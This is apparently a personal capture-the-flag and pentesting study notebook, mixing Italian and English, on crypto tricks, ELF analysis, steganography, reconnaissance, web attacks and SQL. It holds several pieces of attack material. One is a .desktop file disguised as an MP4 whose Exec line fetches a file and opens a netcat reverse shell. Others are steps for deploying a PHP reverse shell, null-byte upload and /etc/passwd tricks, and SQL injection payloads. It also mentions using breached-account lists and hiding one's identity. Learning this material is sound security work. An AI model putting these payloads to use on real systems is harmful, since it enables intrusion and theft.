## Indice
- [Cose da guardare](#cose-da-guardare)
    - [Lista quando hai finito sopra](#lista-quando-hai-finito-sopra)
- [CTF](#ctf)
  - [Crypto](#crypto)
    - [Funzioni python utili](#funzioni-python-utili)
    - [**One-tipe-pad**](#one-tipe-pad)
      - [Crack OTP with MTP (*python module*) (*su kali non sembra andare, parrot ok*)](#crack-otp-with-mtp-python-module-su-kali-non-sembra-andare-parrot-ok)
    - [RSA](#rsa)
      - [Funzionamento:](#funzionamento)
      - [Craccare RSA](#craccare-rsa)
    - [`xor()`](#xor)
    - [*crib drag*](#crib-drag)
      - [Non conosco la chiave, ma conosco parte del testo in chiaro](#non-conosco-la-chiave-ma-conosco-parte-del-testo-in-chiaro)
      - [Ho una chiave di un solo byte](#ho-una-chiave-di-un-solo-byte)
  - [ELF](#elf)
    - [Heap Inspection Security Vulnerability](#heap-inspection-security-vulnerability)
  - [IMMAGINI](#immagini)
    - [Steganografia](#steganografia)
    - [Corruzione header](#corruzione-header)
  - [Reco](#reco)
    - [Sniffing del traffico](#sniffing-del-traffico)
      - [Linux](#linux)
          - [spiegare i comandi `chmod`, `rmmod`, `lsusb`, `lsmod`, `modprobe` e `usbmon`](#spiegare-i-comandi-chmod-rmmod-lsusb-lsmod-modprobe-e-usbmon)
      - [Windows](#windows)
    - [Usefull passive reco tool](#usefull-passive-reco-tool)
    - [Usefull active reconnaissance](#usefull-active-reconnaissance)
          - [`sudo apt install macchanger`](#sudo-apt-install-macchanger)
    - [5 best website pentesting tools on Kali Linux](#5-best-website-pentesting-tools-on-kali-linux)
    - [Email](#email)
      - [`emlAnalyzer`](#emlanalyzer)
      - [Mail generator service](#mail-generator-service)
    - [DNS](#dns)
  - [WEB](#web)
          - [Example 1](#example-1)
    - [Comandi e strumenti](#comandi-e-strumenti)
    - [HTTP](#http)
      - [CODE](#code)
      - [HEADER](#header)
    - [URN URI URL](#urn-uri-url)
    - [Reverse Shell](#reverse-shell)
      - [Reverse shell with an mp4 file (only in linux mint?)](#reverse-shell-with-an-mp4-file-only-in-linux-mint)
    - [Reverse shell php](#reverse-shell-php)
  - [SQL](#sql)
    - [BETWEEN](#between)
    - [IN](#in)
    - [CONCAT](#concat)
    - [UPPER and LOWER](#upper-and-lower)
    - [UNION](#union)
    - [SQL Injection](#sql-injection)

# Cose da guardare
- nodejs
- mongodb
- gdb
- come si fa un progetto:
  - come si documents
  - error handling

### Lista quando hai finito sopra
- wifi: 
	- come funziona, principali cose dal libro
	- come craccarlo
	- aircrackng
	- 
- ram?
- gdb
- elkstack
- docker
- [Backgrounding and Foregrounding in Linux](#backgrounding-and-foregrounding-in-linux)
- Living Off The Land check this [link](https://lolbas-project.github.io/)
- lpc1 security essential
- tycoon
- tmrr
- [pishing e alcuni comandi p metodi da john](#phising)
- rclone.exe
- redline
- john the ripper
- rainbow crack
- mimikatz
- lpc1 security essential
- tycoon ?
- tmrr
- rclone.exe
- redline
- mimikatz
- [snyk.io](https://snyk.io/)
- hashcat
- rustscan
- Cobalt Strike
- nessus
- sliver
- Post-exploitation [thm 1](https://tryhackme.com/room/postexploit)
- bloodhound [link 1](https://www.pentestpartners.com/security-blog/bloodhound-walkthrough-a-tool-for-many-tradecrafts/)  [thm Post-exploitation](https://tryhackme.com/room/postexploit) [youtube 1](https://youtu.be/sGO4F23Xik4)
- Compare Windows 10 Home vs. Pro [link 1](https://www.microsoft.com/en-us/windows/compare-windows-10-home-vs-pro)
- metasploit
- linux pam degradation attack
- tshark
- pyshark
- git
- github
- SCP
- owasp
- [bugcrowd](#bug-bounty)
- [DVWA – Damn Vulnerable Web Application](https://www.homelab.it/index.php/2015/12/24/dvwa-damn-vulnerable-web-application/)
- skipfish
- wapiti
- OWASP zed attack proxy
- XSSer
- [volatility](https://github.com/volatilityfoundation/volatility)
- Meterpreter
- from oliCTF writeups:
  - git
  - pyshark
  - DOM clobbering, DOM based XSS
  - columnar transposition cipher
  - [Cramer-Shoup](https://en.wikipedia.org/wiki/Cramer%E2%80%93Shoup_cryptosystem)
- C:
  - inline functions
  - extern, static
  - optional arguments (C functions declarations pag 84)
  - differenza struct e union
  - bitfields
  - string vulnerabilities, print f (%qualcosa), bufferoverflow

# CTF
## Crypto
Il principale strumento da utilizzare in questo tipo di challenge è Python!!!!!

> Brutto scemo usa chat gpt, ci metti la metà del tempo

> Molte volte la flag non è propriamente cifrata ma semplicemente rappresentata in un encoding diverso tipo `base64` e altre cose simili, usare *Python* oppure usare [CyberChef](https://cyberchef.org/).

Bitwise significa operazioni a livello di bit

### Funzioni python utili
- `b64decode()`
  
  ```Python
  from base64 import b64decode
  print(b64decode('aGVubG8gOik='))
  ```
- `int.to_bytes(length=1, byteorder='big', *, signed=False)` Return an array of bytes representing an integer.

  Il campo `length` è sempre meglio metterlo ad un numero alto tipo $256$, tanto i dati che ci interessano sono rappresentati alla fine.
- [PyCryptodome](https://pycryptodome.readthedocs.io/en/latest/index.html) *(library)*
### **One-tipe-pad**
Questo tipo di cifrario venne inventato da Mauborgne e Vernam nel 1917, esso venne utilizzato per cifrare le comunicazioni avvenute tramite il *telefono rosso*; è un cifrario simmetrico e si basa sull'operazione di **XOR**.

La lunghezza della chiave *k* deve essere uguale alla lunghezza del messaggio *m*, nel momento in cui si va ad effettuare la cifratura il risultato dell'operazione *c*, sarà della stessa lunghezza di *k* e *m*.

Il problema del cifrario sorge nel momento in cui *mittente* e *destinatario* devono scambiarsi la chiave, per questo motivio è necessario che essi si accordino preventivamente su una chiave da *consumare* man mano che la comunicazione procede. 

La suddetta sequenza non può, però essere utilizzata per più di una volta, difatti una volta esaurita sarà necessario generarne un'altra, pena attacchi di tipo [crib-drag](#crib-drag).

#### [Crack OTP with MTP (*python module*)](https://github.com/CameronLonsdale/MTP) (*su kali non sembra andare, parrot ok*)

### RSA
#### Funzionamento:
- Creazione della chiave
  Come possibile destinatario, ogni utente `Dest` deve eseguire le seguenti operazioni:
  - sceglie due [[Numeri Primi]] $p$, $q$ molto grandi;
  - calcola $n = p x q$ e [[La φ di Eulero]] $φ(n) = (p - 1)(q - 1)$;
  - sceglie un intero $e$ minore di $φ(n)$;
  - rende pubblica la chiave $k[pub] = e, n$ e mantiene segreta la chiave $k[prv] = d$.
- Messaggio

  Ogni messsaggio è codificato come sequenza binaria, che viene trattata come un numero intero $m$. Per impiegare il cifrario deve risultare $m < n$, il che è sempre possibile dividendo il messaggio in blocchi di al più $log_2 n$ bit.

  Si noti che la dimensione massima del blocco dipende dalla chiave pubblica del destinatario: si stabilisce in pratica un limite comune per impiegare blocchi delle stesse dimensioni per tutti i destinatari.
- Cifratura

  Per inviare a `Dest` un messaggio $m$, un utente arbitrario genera il crittogramma $c$ calcolando la funzione $c = C(m, k[pub]) = m^e \mod{n}$ ove i valori $e$, $n$ sono contenuti nella chiave pubblica $k[pub]$ di `Dest`. Ovviamente risulta $c < n$.

- Decifrazione

  `Dest` riceve il crittogramma $c$ e lo decifra calcolando $m = D(c,k[prv]) = c^d \mod{n}$, ove il valore di $d$ è contenuto nella sua chiave privata $k[prv]$.

> 1. Generazione delle chiavi:
>     - Chiave pubblica: $(n,e)$
>       - $n = p × q$
>       - $e<ϕ(n)$
>     - Chiave pubblica: $(d, n)$
>       - $d×e≡1 \mod{ϕ(n)}$
> 2. Cifratura: 
>     - $C≡M^e\mod{n}$
> 3. Decifratura: 
>     - $M≡C^d \mod{n}$
> 4. Firma digitale:
>     - Firma: $S≡M^d\mod{n}$ 
>     - Verifica: $M≡S^e\mod{n}
> 
> Dove:
> - $M$ è il messaggio
> - $C$ è il messaggio crittografato
> - $S$ è la firma digitale
> - $n$ è il prodotto di due numeri primi grandi
> - $p$ e q sono i due numeri primi distinti utilizzati per generare n
> - $e$ è l'esponente pubblico
> - $d$ è l'esponente privato
> - $ϕ(n)$ è la funzione di Eulero di $n$
> 

#### Craccare RSA
Ci sono dei tool per craccarlo:
- RsaCtfTool
- [Rsa Decrypt](#RsaCtfTool)

### `xor()`
L'operazione di **OR ESCLUSIVO** detta anche **XOR** serve a trovare due numeri diversi, ovvero il risultato sarà uguale a **1** se i due numeri non saranno uguali.

Le sue proprietà sono quella commutativa e date due variabili binarie *x* e *y* : `x ⊕ y ⊕ y = x`.

```Python
def xor(a, b):
  return bytes([x^y for x,y in zip(a,b)])
```

Se non va applicare all'input: `bytes.fromhex(a)`

Alternativamente c'è la funzione `xor` su [CyberChef](https://cyberchef.org/)

### *crib drag*
Nel caso del riutilizzo della chiave si introducono debolezze: conoscendo qualcosa di uno dei messaggi, è possibile decifrarli senza avere informazioni sulla chiave.

```Python
ciphertext = bytes.fromhex("104e137f425954137f74107f525511457f5468134d7f146c4c")
key = b'S'  # La chiave che abbiamo trovato

def decrypt(ciphertext, key):
    return bytes([c ^ key for c in ciphertext])

def crib_drag(ciphertext, crib):
    crib_len = len(crib)
    for i in range(len(ciphertext) - crib_len + 1):
        possible_plaintext = bytes([ciphertext[i + j] ^ crib[j] for j in range(crib_len)])
        print("Posizione {}: {}".format(i, possible_plaintext))

# Decifrare il testo cifrato con la chiave trovata
plaintext = decrypt(ciphertext, key)

# Esempio di crib dragging con "flag{"
crib = b'flag{'
crib_drag(plaintext, crib)
```

#### Non conosco la chiave, ma conosco parte del testo in chiaro
```Python
cipher_txt = bytes.fromhex("0e0b213f26041e480b26217f27342e175d0e070a3c5b103e2526217f27342e175d0e077e263451150104")
partial_flag = 'crypto{'

key = ''.join([chr(cipher_txt[i] ^ ord(partial_flag[i])) for i in range(len(partial_flag))])

output = b''
for i in range(len(cipher_txt)):
    output += bytes([cipher_txt[i] ^ ord(key[i % len(key)])])

print(output)
```
#### Ho una chiave di un solo byte 
```Python
ciphertext = bytes.fromhex("104e137f425954137f74107f525511457f5468134d7f146c4c")

# proviamo tutte le possibili chiavi (byte)
for key in range(256):  
    # decifriamo il testo cifrato con la chiave corrente
    plaintext = bytes([c ^ key for c in ciphertext])  
    print(plaintext)
```

## ELF
An **ELF** is an executable file, a binary file, this format is used in [Linux](#linux), it is used for both reverse and pwn challenge.

A binary file can be static or dinamic

To execute a ELF file: `chmod +x nomefile`, more about `chmod` [here](#chmod)
> Se non vanno mettere davanti al nome del file ./ e aggiungere il permesso di esecuzione 

When you have a Binary challenge you have to understand how the program works, before using ghidra you can try this commands:
- `strings`
- `file`
- `ldd` - *permette di elencare le shared libraries richieste da un file binario*.
- [ltrace](#)
- [strace](#)
- `objdump` - *displays information about one or more object files* 
  - use the `-d` option to list the section of the ELF 
  - `-h` ti permette di elencare le sezioni di un ELF
- `objcopy`
  - `objcopy --dump-section .text=main_text main out_objcopy` - *This command extracts the .text section from main and saves it to out_objcopy* (provalo, tante volte la flag è nascosta in sezioni tipo commenti o text).
- `readelf`, use the `-h` option
- `checksec`

> A **stripped file** is a file without symbolic information (and other information not required for execution)
### Heap Inspection Security Vulnerability
- [Heap Inspection Security Vulnerability | C Programming Tutorial](https://youtu.be/hHlE2BpxjKU) - by Portfolio Courses
- [The Heap: How do use-after-free exploits work? - bin 0x16](https://youtu.be/ZHghwsTRyzQ) - by LiveOverflow

Quando libero la memoria in realtà non vado a riazzerarla, bensì tolgo solo i vincoli che la bloccavano: 

*prendendo ad esempio [C](#c), la funzione `free()` libera la memoria, tuttavia nel momento in cui io vado a riaccedere a quelle celle di memoria trovo ancora i dati che erano stati lasciati precedentemente*.

## IMMAGINI
Eseguire i classici comandi:
- files
- strings
- exiftool
- head
- [ImageMagick](#imaginemagick) ***Run the command using***: `display`
-  [aperisolve](https://www.aperisolve.com/) *è un insieme di tutti i possibili metodi, fa un'analisi generale*

### Steganografia
Molte volte si usa nascondere la flag all'interno dell'immagine, utilizzando la tecnica della [[steganografia]].

Di seguito alcuni comandi e strumenti utilizzati per estrarre i file conenuti all'interno di un altro file, che giro strano di file dentro altri file che contengono file?

- `binwalk`
    Di base è possbile usare [binwalk](#binwalk)  senza alcuna opzione per controllare se nel file siano presenti altri contenuti nascosti, in caso positivo con l'opzione `-e`: `binwalk -e nomefile` si possono estrarre, è l'opzione più **conveniente** e **semplice**.
- aperisolve
    Aperisolve è un sito che analizza le immagini mostrando varie informazioni tra cui eventuali file nascosti, è scomodo e funziona male
- `stego-lsb`
    Un tool come [***stego-lsb***](https://github.com/ragibson/Steganography) può estrarre file nascosti dentro altri file

    `stegolsb steglsb -r -i Gab-chan.png -o output_file.zip -n 2`

    Dove:
    - `steglsb` serve a trovare file nascosti nell'ultimo bit rgb delle immagini

    ```
        Command Line Arguments:
        -h, --hide                      To hide data in an image file
        -r, --recover                   To recover data from an image file
        -a, --analyze                   Print how much data can be hidden within an image   [default: False]
        -i, --input TEXT                Path to an bitmap (.bmp or .png) image
        -s, --secret TEXT               Path to a file to hide in the image
        -o, --output TEXT               Path to an output file
        -n, --lsb-count INTEGER         How many LSBs to use  [default: 2]
        -c, --compression INTEGER RANGE
                                        1 (best speed) to 9 (smallest file size)  [default: 1]
        --help                          Show this message and exit.
    ```
- `steghide`
    Steghide is a steganography program that is able to hide data in various kinds of image‐ and audio‐files. The color‐ respectivly sample‐frequencies are not changed thus making the embedding resistant against first‐order statistical tests.

    An exemple from a *picoCTF*: `steghide extract -sf file -p DUEDILIGENCE`
- `stegsolve`
    staganografia: cosa sarebbe? Nascondere cose nelle immagini?

    Passare poi a stegsolve: recarsi nella cartella tools della tools e lanciare il comando:
    ```bash
        java -jar stegsolve.jar
    ```
- Steganos Security Suite
- S-Tools
- OutGuess
- Invisible Secrets 4
- MSU StegoVideo

### Corruzione header 
Se pensi che sia necessario modificare l'header dell'immagine, è necessario capire il tipo di immagine e poi modificare l'header copiandolo da un'immagine in quel formato, per farlo è possibile utilizzare un software quale [HxD]()

## Reco

> Il fatto che usiamo la conoscenza "pubblica" senza attaccare direttamente il nostro target non implica che in caso di indigini la nostra non possa essere ritwnuta come un sospettato, difatti sarebbe come andare in un negozio e chiedere come è strutturata la cassa che conserva il loro denaro, è di conseguenza **di fondamentale importanza mascherare sé stessi** usando TOR o una VPN.

### Sniffing del traffico
Uno dei principali scopi dello sniffing del traffico USB è la creazione di un keylogger.

#### Linux
Il comando [`modprobe`](#modprobe) with `usbmon` permette di catturare pacchetti da un bus USB.

Run `modprobe usbmon` per caricare il driver `usbmon` nel kernel, per verificare che l'operazione abbia avuto successo usare il comando [`lsmod`](#lsmod): `lsmod | grep usbmon`.

Avviare Wireshark, saranno disponibili alcune interfacce `usbmon x`, per selezionare l'interfaccia giusta eseguire il comando [`lsusb`](#lsusb) nel terminale.

Nel caso in cui la cattura non andasse a termine l'utente potrebbe non avere i privilegi necessari per vedere i pacchetti, eseguire perciò il comando [`chmod`](#chmod) per acquisire i permessi: `chmod 644 /dev/usbmon2`, attenzione perché potrebbe aprire importanti falle di sicurezza.

Dopo aver terminato eseguire il comando [`rmmod`](#rmmod) per rimuover il driver `usbmon` dal kernel: `rmmod usbmon`.
###### spiegare i comandi `chmod`, `rmmod`, `lsusb`, `lsmod`, `modprobe` e `usbmon`
#### Windows
Per catturare il traffico sul bus *USB* su *Windows* è necessario appoggiarsi al comando [`USBPcap`](#usbpcap): eseguirlo, selezionare il dispositivo ed effettuare la scansione, al terminine aprire il file creato dal comando con Wireshark.

### Usefull passive reco tool
- [whois](#whois)
- `nslookup`
- [`email check`](#email)
- `TheHarvester`
- `Maltego`
- `Metagoofil`
- `Recon-Ng`
- TinEye
- SpiderFoot
- Creepy 
- [shodan](#shodanio)
- [dns dumpster](#dnsdumpster)
- [check username](https://checkusernames.com/)
- [Talos Reputation](#talos-reputation)
- [IPinfo.io](#ipinfoio)
- [Inquest](#inquest)
- [Urlscan.io](#urlscanio)
- [phonebook.cz](https://phonebook.cz/)(Domains,Email Addresses and URLs)
- Google Dorks
- [VirusTotal](#virustotal)
- [Browserling](#browserling)
- [Wannabrowser](#wannabrowser)
- [PhoneInfo.ga](#phoneinfoga)
- Site archive history:
  - [oldweb.today](https://oldweb.today/#19960101/http://geocities.com/)
  - [Wayback Machine](https://archive.org/web/)
  - [Library of Congress](https://www.loc.gov/)

### Usefull active reconnaissance
- [[Gobuster]]
- [[Nikto]]
- [nmap](#nmap)
- traceroute
- ping
- netcat
- telnet
- ssh
- metasploit
- nessus
- Spyse
- OpenVAS
- [rustscan](#rustscan)
- [smbclient](#smbclient)

###### `sudo apt install macchanger`
Non esiste una vera e propria lista da seguire, ma ci sono dei piccoli *punti* che possono essere seguiti o attuati:
- [[Network sniffing]]
- [[Capture USB traffic]]

### [5 best website pentesting tools on Kali Linux](https://youtu.be/y6W1kc1jOkI)
1. perform a [nikto](#nikto) scan
2. perform a skipfish analisys
3. perform a wapiti analisys
4. `macchanger` (to hide identity)
    MAC Changer is an utility that makes the maniputation of MAC addresses of network interfaces easier.

    Features:
    - set specific MAC address of a network interface
    - set the MAC randomly
    - set a MAC of another vendor
    - set another MAC of the same vendor
    - set a MAC of the same kind (eg: wireless card)
    - display a vendor MAC list (today, 6200 items) to choose from

    1. Using [`ip addr`](#ip) lists all the network interfaces
    2. Show the current inteface's ip address `macchanger -s interface_name`
    3. Assing a random ip address`sudo macchanger -r interface_name` or `sudo macchanger --mac=a2:42:b0:20:ee:03 interface_name` to assign a specific address.
    4. To restore the default address:`sudo apt remove macchanger`

### Email
Email reputation:
- [emailrep.io](https://emailrep.io/)
- [senderscore](https://senderscore.org/)
- [Barracuda Reputation](https://www.barracudacentral.org/lookups/lookup-reputation)
- check with `emlAnalyzer`
- [hunter.io](https://hunter.io/)
- [phonebook.cz](https://phonebook.cz/)
- [voilanobert](https://www.voilanorbert.com/)
  
#### `emlAnalyzer`
#### Mail generator service
- [temp-mail.org](https://temp-mail.org/it/)

Per craccare una mail è fondamentale non sottovalutare il bottone `password dimenticata`.

Di fondamentale importanza sono le liste di account violati disponibili online, in quel caso vanno scaricate e va usato un toll quale [breach-parse](https://github.com/hmaverickadams/breach-parse)

### DNS
Query DNS server:
- `dig`: fa query ad un **server DNS** di conseguenza è come fare richieste ai dns di google (`8.8.8.8`), ad esempio: `dig @newstate.challs-terr.olicyber.it -p 12008 the.flag any`, `any` serve a richiedere tutti i record disponibili.
- `host`
- `dnslookup`
- [dnsdumpster](https://dnsdumpster.com/)

## WEB
- `curl sito | grep flag` provarlo sempre, potrebbe funzionare...
- Se non trovi la risposta e hai delle richieste HTTP prova a **cambiare** il *metodo*
- Se il **check** è via **js** scarica tutta la pagina e la modifichi in locale come vuoi ( *se non riesci a modificarla live sul broser* )
- **Se non trovi la risposta fai generare errori a php**
- **`.DS_Store`**: is a common file in some websites, I think only in Apache servers, it is connected with MAC and Storage

- **Insecure direct object reference (IDOR) vulnerability** arises when attackers can access or modify objects by manipulating identifiers used in a web application's URLs or parameters. It occurs due to missing access control checks, which fail to verify whether a user should be allowed to access specific data. (`http://notes.challs.olicyber.it/account/account_number_that_you_want`)

- **`.htaccess`**: is a common file in a lots of websites, I think only in Apache servers

- **[Null Byte Injection](https://youtu.be/jBtzFGwHvxE)** (*upload dei file*): a technique for sending data that would be filtered otherwise. It relies on injecting the null byte characters (%00, \x00) in the supplied data. Its role is to terminate a string.
   
   Se non funziona ci sono dei video:
  - [Web Application Hacking - File Upload Attacks Explained](https://youtu.be/YAFVGQ-lBoM)
  - [How To Bypass Website File Upload Restrictions](https://youtu.be/xZd1JWmLGLk)
  - [File Upload Vulnerabilities & Filter Bypass](https://youtu.be/ZWG1nNdUnBc)

  Una volta caricato il file che vuoi puoi provare una [*reverse-shell*](#reverse-shell)

  ###### Example 1
  1. An attacker wants to retrieve the file `/etc/passwd` but an extension `.php` is appended automatically such as `/etc/passwd.php`.
  2. The attacker uses the null byte to terminate the string and throw away the `.php` extension: `/etc/passwd%00`
   
    ###### Example 2
     1. An attacker wants to upload a `malicious.php`, but the only extension allowed is `.pdf`.
     2. The attacker constructs the file name such as `malicious.php%00.pdf` and uploads the file.
     3. The application reads the `.pdf` extension, validate the upload, and later throws the end of the string due to the null byte.
     4. The file `malicious.php` is then put in the server.

- **Redirect Links**
Add `+` at the end of the URL to see the site where the redirect links will bring you: `https://tinyurl.com/bw7t8p4u+`

- **`robots.txt`**
Sometimes the websites contain a robots.txt file, it can be usefull for example for the SEO, in particular we could don't want to indexing our web sites.

- Sessioni
Il cookie sessione è in base 64, decodificarlo e vedere come è scritto, non sempre è possibile copiarlo ed essere loggati, però in alcuni casi si. Per defifrarlo basta usare [CyberChef](https://cyberchef.org/)

- Prova sempre a loggarti come **admin**

- Cambiare `IP` di provenienza: è un *header*, tipicamente `X-Forwarded-For` o `Forwarded`

### Comandi e strumenti
- Gobuster
- [nikto](#nikto)
- [rustscan](#rustscan)
- [smbclient](#smbclient)

Modificare ed effettuare richieste particolari:
- postman
- Requests *python library* (file `web.py`)
- burp suite

### HTTP 
#### CODE
- 100 - 199 (Information)
- 200 - 299 (Successful)
- 300 - 399 (Redirection)
- 400 - 499 (Client error)
- 500 - 599 (Server error)

#### HEADER
- GET: richiede al server una risorsa, possono essere specificati alcuni parametri attraverso la coppia: chiave=valore&chiave1=valore1
- HEAD: richiede solo l'header, tipicamente utilizzato in fase di testing
- POST: invia informazioni all'indirizzo indicato, esse sono inserite nel body della richiesta
- PUT: esegue l'upload di un file su server
- DELETE: cancella una risorsa
- OPTIONS: richiede al server l'elenco dei metodi concessi
- TRACE: traccia una richiesta

### URN URI URL
L'Uniform Resource Identifier, URI, è una stringa che identifica univocamente una risorsa; l'Uniform Resource Locator è una specifica dell'URI che comprende, oltre al percorso che identifica la risorsa, viene aggiunto il protocollo usato per accendervi, comunemente il termine URL viene usato impropriamente per riferirsi ad ogni tipo di URI.

In addizione a URI e URL esiste anche l'Uniform Resource Name, URN, il quale è anch'esso un sottoinsieme dell'URI, ma a differenza dell'URL indica solo il percorso della risorsa.

Le risorse vengono identificate con un URI, se esso indica anche il protocollo con cui accedere alla risorsa è un URL, altrimenti è un URN.

- **URL** `https://www.tiadeca.com/blog-page.php`
- **URN** `tiadeca.com/blog-page.php`

### Reverse Shell
Aprire una reverse shell significa poter eseguire comandi sulla macchina vittima e avere quindi un possibile controllo equivalente al 100%, il tutto dipende dai privilegi che si riesce ad ottenere attraverso le tattiche di [[Post-exploitation]] o in base alla o alle vulnerabilità sfruttate, individuate grazie ai metoditi di [[Reconnaissance]], sia [[Active Reconnaissance]] che [[Passive Reconnaissance]].

#### Reverse shell with an mp4 file (only in linux mint?)
> whatch [this](https://youtu.be/ZlfloTpLGT0?list=PL0fOAKA0mBdspB0x8BhMegc0ZoEwQpq32) video or read [this](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078/) article

1. Create a file named `name.desktop`
2. write in there these lines:
   ```
        [Desktop Entry]
        Encoding=UTF-8
        Name=fake_video.mp4
        Exec=/usr/bin/wget 'http://192.168.1.XX/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 192.168.1.XX 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
        Terminal=false
        Type=Application
        Icon=video-x-generic
   ```
3. change the first ip addr with **your local server** ip addr
4. change the second ip addr with **your local server** ip addr

### Reverse shell php
1. Download the file [here](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

2. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to [ilmioip](https://www.mio-ip.it/) in the browser of your device). 

3. We're now going to listen to incoming connections using netcat. Run the following command: `nc -lvnp 1234`

4. Search the page to load and execute your payload

> As you can see you will open a local server on your computer on port 1234, from here, using ncat you will interact with the target host shell

> Per mettere online il server locale ci si può appoggiare ad ngrok

## SQL
Query exercises [here](https://www.sql-practice.com/)
### BETWEEN
Il primo dato deve essere il limite inferiore, il secondo il superiore, non viceversa.

> I limiti sono compresi: <br>
> ` BETWEEN 4 AND 10 ` comprende sia 4 che 10
### IN
Al posto di usare molteplici ` OR ` uso un ` IN `; esso mi consente di cercare un valore in una lista di valori.

```sql
    SELECT ... WHERE name IN ('Sara','Vanessa','Marta','Giulia')
```

> Oltre al costrutto ` IN ` esiste anche il ` NOT IN `
### CONCAT
Permette di concatenare più stringhe
```sql
    SELECT CONCAT(FirstName, ', ' , City) FROM customers;
```
### UPPER and LOWER
The **UPPER** function converts all letters in the specified string to uppercase.
The **LOWER** function converts the string to lowercase.

```sql
    SELECT FirstName, UPPER(LastName) AS LastName FROM employees;
```
### UNION
`UNION` in SQL concat two or more `SELECT`, without the `ALL` keyword it consider all values once, so the duplicate will be delete.

> All the select in a UNION must have the same number of column

```sql
    SELECT ID, FirstName, LastName, City FROM First
    UNION ALL
    SELECT ID, FirstName, LastName, City FROM Second;
```
### SQL Injection
- database() return the name of the database

```sql
    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
Una volta trovato il nome del database posso cercare tutte le tabelle che appartengono a questo database
*There are a couple of new things to learn in this query. Firstly, the method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users.*

```sql
    UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```

```sql
    https://website.thm/analytics?referrer=referrer=admin123' UNION SELECT SLEEP(2),2 where database() like 'sqli_four';--
    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--

    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%';

    admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
    username
```
